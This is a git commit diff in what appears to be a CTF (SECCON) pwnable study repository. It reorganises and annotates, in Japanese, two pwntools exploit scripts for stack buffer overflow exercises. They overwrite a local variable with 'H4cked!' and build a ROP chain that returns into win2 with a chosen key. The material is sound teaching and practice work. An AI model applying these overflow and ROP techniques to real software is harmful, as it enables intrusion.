9c4707e98c01c3c6dbb99478fef2ec84f2135c18
none <none@example.com>
2025-04-21 13:13:34 -0300

    up

--- seccon_detail/pwnable/sbof/sbof_lv/sbof_lv.py
+++ seccon_detail/pwnable/sbof/sbof_lv/sbof_lv.py
@@ -1,16 +1,4 @@
 #!/usr/bin/env python3
-from pwn import *
-import sys
-import struct
-
-bin_file = './sbof_lv'
-context(os = 'linux', arch = 'amd64')
-
-context.binary = bin_file
-context.terminal = ['bash', 'splitw', '-h']  # 環境に応じて変えてください
-context.log_level = 'debug'  # または 'info'
-
-binf = ELF(bin_file)
 
 """
 ■対象ソースコード
@@ -31,7 +19,31 @@ binf = ELF(bin_file)
 			├─────┴─────┼───────────┤
 	rbp		│	saved rbp			│	return 	address		│
 			└───────────┴───────────┘
+
+■スタックのメモリ書き換え
+			┌───────────────────────┐
+	-0x30	│					'a' * 0x10					│
+			├───────────────────────┤
+	-0x20	│				'H4cked!'	'\x00'* 9			│
+			├─────┬─────┬───────────┤
+	-0x10	│0x00000000│0xdeadbeef│	0x0000000040204b	│
+			├─────┴─────┼───────────┤
+	rbp		│	saved rbp			│	return address		│
+			└───────────┴───────────┘
 """
+
+from pwn import *
+import sys
+import struct
+
+bin_file = './sbof_lv'
+context(os = 'linux', arch = 'amd64')
+
+context.binary = bin_file
+context.terminal = ['bash', 'splitw', '-h']  # 環境に応じて変えてください
+context.log_level = 'debug'  # または 'info'
+
+binf = ELF(bin_file)
 
 def attack_32_9_11(conn, **kwargs):
     exploit  = b'a' * 0x10						# nameへの書き込み
--- seccon_detail/pwnable/sbof/sbof_rop/sbof_ret.py
+++ seccon_detail/pwnable/sbof/sbof_rop/sbof_ret.py
@@ -1,4 +1,39 @@
 #!/usr/bin/env python3
+
+"""
+■対象ソースコード
+・sbof_ret.c
+
+■脆弱性
+・標準入力で、以下のローカル変数に書き込みできるが、nameが16byteしかないため、
+  スタックバッファーオーバーフローする。
+	char name[0x10]
+
+■スタックのメモリ配置
+			┌───────────┐
+	-0x10	│	'a' * 0x10			│
+			│						│
+			├───────────┤
+	rbp		│	saved rbp			│
+			├───────────┤
+	+0x8	│	return address		│
+			└───────────┘
+
+■スタックのメモリ書き換え
+			┌───────────┐
+	-0x18	│	'a' * 0x10			│
+			│						│
+			├───────────┤
+	-0x8	│	0x00000000deadbeef	│	←ダミー（何でもよい）
+			├───────────┤
+	rsp		│	pop rdi; ret		│	←第一引数書き換えのためのROPガジェット
+			├───────────┤
+	+0x8	│	0x00000000cafebabe	│	←win2()の第一引数key
+			├───────────┤
+	+0x10	│	win2				│
+			└───────────┘
+"""
+
 from pwn import *
 import sys
 import struct
@@ -16,11 +51,11 @@ rop = ROP(binf)
 def attack_35_27(conn, **kwargs):
     rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])
     print(f"Found pop rdi; ret at: {hex(rdi_gadget.address)}")
-    exploit =  b'a' * 0x10
-    exploit += struct.pack('<Q', 0xdeadbeef)
-    exploit += struct.pack('<Q', rdi_gadget.address)
-    exploit += struct.pack('<Q', 0xcafebabe)
-    exploit += struct.pack('<Q', binf.functions['win2'].address)
+    exploit =  b'a' * 0x10								# nameへの書き込み
+    exploit += struct.pack('<Q', 0xdeadbeef)			# ダミー（何でもよい）
+    exploit += struct.pack('<Q', rdi_gadget.address)	# 第一引数書き換えのためのROPガジェット
+    exploit += struct.pack('<Q', 0xcafebabe)			# win2()の第一引数key
+    exploit += struct.pack('<Q', binf.functions['win2'].address)	# win2()のアドレス
     conn.sendline(exploit)
     print(conn.recvall().decode())
 
